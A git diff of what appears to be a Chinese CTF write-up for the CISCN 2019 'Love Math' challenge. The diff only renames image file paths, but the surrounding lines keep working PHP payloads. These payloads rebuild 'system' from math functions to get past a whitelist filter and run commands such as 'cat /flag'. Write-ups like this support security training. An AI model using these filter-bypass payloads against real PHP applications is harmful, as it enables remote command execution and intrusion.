@@ -66,7 +66,7 @@ echo 'base_convert(37907361743,10,36)(dechex(1598506324)) ==> ' . base_convert(3
 c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=ls
 ```
 
-![](./img/[CISCN 2019 初赛]Love Math-2.png)
+![](./img/[CISCN2019初赛]LoveMath-2.png)
 
 ### 2. 方法二
 
@@ -91,7 +91,7 @@ for($i=1;$i<=sizeof($white);$i++){
 }
 ```
 
-![](./img/[CISCN 2019 初赛]Love Math-1.png)
+![](./img/[CISCN2019初赛]LoveMath-1.png)
 
 我们随便挑两个组合起来就行
 
@@ -99,7 +99,7 @@ for($i=1;$i<=sizeof($white);$i++){
 c=$pi=(is_finite^(6).(4)).(rad2deg^(7).(5));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag
 ```
 
-![](./img/[CISCN 2019 初赛]Love Math-3.png)
+![](./img/[CISCN2019初赛]LoveMath-3.png)
 
 ### 3. 方法三
 
